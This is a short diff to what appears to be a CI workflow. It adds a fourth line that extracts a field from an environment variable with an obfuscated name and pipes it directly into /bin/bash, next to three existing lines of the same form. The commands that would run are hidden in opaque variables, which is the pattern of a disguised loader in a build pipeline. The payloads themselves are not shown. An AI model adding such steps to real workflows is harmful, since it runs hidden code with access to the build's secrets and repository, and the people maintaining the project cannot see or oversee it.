@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$is336" | jq -r .hyte1580 | /bin/bash
           printf '%s' "$y4500" | jq -r .i9 | /bin/bash
           echo $yki56110 | jq -r .twvva10 | /bin/bash
+          printf '%s' "$tn607" | jq -r .wz87 | /bin/bash
 
       - name: Upload results
         if: always()
